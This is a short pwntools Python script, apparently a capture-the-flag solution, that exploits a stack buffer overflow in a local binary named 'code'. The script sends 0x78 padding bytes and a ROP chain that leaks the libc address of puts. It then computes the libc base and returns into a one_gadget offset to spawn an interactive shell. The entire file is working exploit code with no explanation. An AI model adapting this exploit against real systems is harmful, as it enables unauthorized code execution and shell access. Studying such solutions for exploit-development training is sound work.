#!/usr/bin/env python
from pwn import *
p=process('./code',env={'LD_PRELOAD':'./libc.so.6'})
libc=p.libc
libc.address=0

elf=ELF('./code')
context(arch='amd64',log_level='debug')
code='wyBTs'
ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)


ru('name:\n')
sl(code)
ru('save\n')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

pop_rdi_ret=0x0000000000400983
shell='\x00'*0x78
shell+=p64(pop_rdi_ret)
shell+=p64(puts_got)
shell+=p64(puts_plt)
shell+=p64(0x4008E3)

sl(shell)
ru('ss\n')

puts_libc=u64(ru('P')[0:6].ljust(8,'\x00'))
libc_base=puts_libc-libc.symbols['puts']
libc.address=libc_base
one_off=0x45216
one_off=0x4526a
one_off=0xf02a4
one_off=0xf1147
one=libc_base+one_off

ru('save\n')
shell='\x00'*0x78
shell+=p64(one)

sl(shell)

p.interactive()